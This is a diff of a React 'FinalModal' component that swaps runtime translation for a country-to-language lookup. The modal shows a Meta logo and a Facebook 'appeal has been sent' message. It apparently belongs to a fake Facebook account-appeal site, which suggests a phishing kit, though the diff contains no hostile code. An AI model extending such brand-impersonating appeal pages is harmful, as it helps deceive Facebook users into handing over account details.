@@ -1,35 +1,33 @@
 import FinalImage from '@/assets/images/final-image.png';
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
-import translateText from '@/utils/translate';
+import { getTranslations } from '@/utils/translate';
 import Image from 'next/image';
-import { useEffect, useState, type FC } from 'react';
+import { useMemo, type FC } from 'react';
 
 const FinalModal: FC = () => {
-    const [translations, setTranslations] = useState<Record<string, string>>({});
-
     const { geoInfo } = store();
+    
+    // Get language from country code
+    const countryToLanguage: Record<string, string> = useMemo(() => ({
+        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
+        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
+        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
+        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
+        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
+        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
+        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
+    }), []);
+    
+    const translations = useMemo(() => {
+        const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
+        const lang = countryToLanguage[countryCode] || 'en';
+        return getTranslations(lang);
+    }, [geoInfo, countryToLanguage]);
+
     const t = (text: string): string => {
         return translations[text] || text;
     };
-
-    useEffect(() => {
-        if (!geoInfo) return;
-
-        const textsToTranslate = ['Request has been sent', 'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.', 'Return on Facebook'];
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
 
     return (
         <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-2 md:px-4'>
